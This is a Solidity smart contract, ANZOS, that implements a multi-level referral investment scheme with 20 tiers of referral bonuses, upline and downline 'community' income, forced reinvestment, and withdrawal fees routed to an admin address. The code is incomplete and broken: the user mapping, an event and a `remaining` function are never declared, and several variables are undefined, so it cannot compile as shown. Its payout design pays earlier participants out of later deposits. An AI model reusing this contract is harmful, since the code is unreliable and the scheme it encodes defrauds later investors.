pragma solidity ^0.5.10;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract ANZOS{
    using SafeMath for uint256;
    uint256 public INVEST_MIN_AMOUNT = 0.1 ether;
    uint256 public withdrawLimit = 0.2 ether;
    uint256 constant public PERCENTS_DIVIDER = 1000;
    uint256 public totalUsers;
    uint256 public totalInvested;
    uint256 public totalWithdrawn;
    uint256 public totalDeposits;
    uint256[20] public ref_bonuses = [100, 50, 50, 50, 20, 20, 20, 20, 20, 20, 10, 10, 5, 5, 5, 3, 3, 3, 3, 3];
    uint256[6] public defaultPackages = [0.1 ether,0.5 ether,1 ether ,2 ether,5 ether,10 ether];
    uint256[20] public requiredDirect = [0.1 ether, 0.1 ether, 0.1 ether, 0.5 ether, 0.5 ether, 0.5 ether, 0.5 ether, 0.5 ether, 0.5 ether, 0.5 ether, 2 ether, 2 ether, 2 ether, 2 ether, 2 ether, 5 ether, 5 ether, 5 ether, 5 ether, 5 ether];
    mapping(uint256 => address payable) public singleLeg;
    uint256 public singleLegLength;
    address payable public admin;
    address payable public admin2;
    struct User {
        uint256 singleLegPosition;
        uint256 amount;
        uint256 checkpoint;
        address referrer;
        uint256 referrerBonus;
        uint256 totalWithdrawn;
        uint256 totalReferrer;
        uint256 totalFees;
    }
	
    function _refPayout(address _addr, uint256 _amount) internal {
        address up = users[_addr].referrer;
        for(uint256 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].amount >= requiredDirect[i]){
                uint256 bonus = _amount.mul(ref_bonuses[i]).div(PERCENTS_DIVIDER);
                users[up].referrerBonus = users[up].referrerBonus.add(bonus);
            }
            up = users[up].referrer;
        }
    }

    function invest(address referrer) public payable {
        require(msg.value >= INVEST_MIN_AMOUNT,'Min invesment 0.1 BNB');
        User storage user = users[msg.sender];
        if (user.referrer == address(0) && (users[referrer].checkpoint > 0 || referrer == admin) && referrer != msg.sender ) {
            user.referrer = referrer;
        }
        require(user.referrer != address(0) || msg.sender == admin, "No upline");
        require(user.referrer == referrer, "Error upline");
        if (user.checkpoint == 0) {
            singleLeg[singleLegLength] = msg.sender;
            user.singleLegPosition = singleLegLength;
            singleLegLength++;
            totalUsers = totalUsers.add(1);
            address upline = user.referrer;
            users[upline].totalReferrer++;
        }
    }

    function _withdrawal() external{
        User storage _user = users[msg.sender];
        uint256 remainingBonus = remaining(msg.sender);
        require(remainingBonus >= withdrawLimit, "limit min");
        uint256 _fees = remainingBonus.div(20);
        uint256 actualAmountToSend = remainingBonus.sub(_fees);
        _user.totalFees = _user.totalFees.add(_fees);
        (uint256 reivest,uint256 withdrawal) = getEligibleWithdrawal(msg.sender);
        reinvest(msg.sender,actualAmountToSend.mul(reivest).div(100));
        uint256 withdrawalAmount = actualAmountToSend.mul(withdrawal).div(100);
        _user.totalWithdrawn = _user.totalWithdrawn.add(withdrawalAmount);
        totalWithdrawn = totalWithdrawn.add(remainingBonus);
        _safeTransfer(msg.sender,withdrawalAmount);
        _safeTransfer(admin,_fees);
        emit Withdrawn(msg.sender,withdrawalAmount);
    }


    function reinvest(address _user, uint256 _amount) private{
        User storage user = users[_user];
        user.amount = user.amount.add(_amount);
        totalInvested = totalInvested.add(_amount);
        totalDeposits = totalDeposits.add(1);
        _refPayout(_user,_amount);
    }

    function GetUplineIncomeByUserId(address _user,uint256 upMaxLevel) public view returns (uint256 bonus){
        User storage user = users[_user];
        if(user.singleLegPosition > 0){
            uint256 upLegPosition = user.singleLegPosition.sub(1);
            for (uint256 i = 0; i < upMaxLevel; i++) {
                if (singleLeg[upLegPosition] != address(0) && upLegPosition > 0) {
                    bonus = bonus.add(users[singleLeg[upLegPosition]].amount);
                    upLegPosition = upLegPosition.sub(1);
                }else break;
            }
            bonus = bonus.div(200);
        }
        return bonus;
    }

    function GetDownlineIncomeByUserId(address _user,uint256 downMaxLevel) public view returns(uint256 bonus){
        User storage user = users[_user];
        for (uint256 i = 0; i < downMaxLevel; i++) {
            if (singleLeg[downLegPosition] != address(0)) {
                bonus = bonus.add(users[singleLeg[downLegPosition]].amount);
                downLegPosition = downLegPosition.add(1);
            }else break;
        }
        bonus = bonus.div(200);
        return bonus;
    }


    function getEligibleLevelCountForUpline(address _user) public view returns (uint256 uplineCount, uint256 downlineCount){
        uint256 TotalDeposit = user.amount;
        if (TotalDeposit >= defaultPackages[3]) {
            uplineCount = 40;
            downlineCount = 60;
        }else if (TotalDeposit >= defaultPackages[2]) {
            uplineCount = 30;
            downlineCount = 50;
        }else if (TotalDeposit >= defaultPackages[1]) {
            uplineCount = 20;
            downlineCount = 40;
        }else if(TotalDeposit >= defaultPackages[0]) {
            uplineCount = 10;
            downlineCount = 10;
        }else{
            uplineCount = 0;
            downlineCount = 0;
        }

        return (uplineCount, downlineCount);
    }

    function getEligibleWithdrawal(address _user) public view returns(uint256 reivest, uint256 withdrawal){
        User storage user = users[_user];
        uint256 TotalDeposit = user.amount;
        if(TotalDeposit >= defaultPackages[5]){
            reivest = 30;
            withdrawal = 70;
        }else if(TotalDeposit >= defaultPackages[4]){
            reivest = 40;
            withdrawal = 60;
        }else if(TotalDeposit >= defaultPackages[3]){
            reivest = 45;
            withdrawal = 55;
        }else if(TotalDeposit >= defaultPackages[2]){
            reivest = 50;
            withdrawal = 50;
        }else if(TotalDeposit >= defaultPackages[1]){
            reivest = 55;
            withdrawal = 45;
        }else if(TotalDeposit >= defaultPackages[0]){
            reivest = 60;
            withdrawal = 40;
        }else{
            reivest = 0;
            withdrawal = 0;
        }
        return (reivest, withdrawal);
    }

    function TotalBonus(address _user) public view returns(uint256){
        User storage user = users[_user];
        (uint256 upMaxLevel,uint256 downMaxLevel) = getEligibleLevelCountForUpline(_user);
        uint256 communityBonus = GetUplineIncomeByUserId(_user,upMaxLevel).add(GetDownlineIncomeByUserId(_user,downMaxLevel));
        uint256 TotalEarn = communityBonus.add(user.referrerBonus);
        return TotalEarn;
    }

    function _safeTransfer(address payable _to, uint256 _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
        _to.transfer(amount);
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}
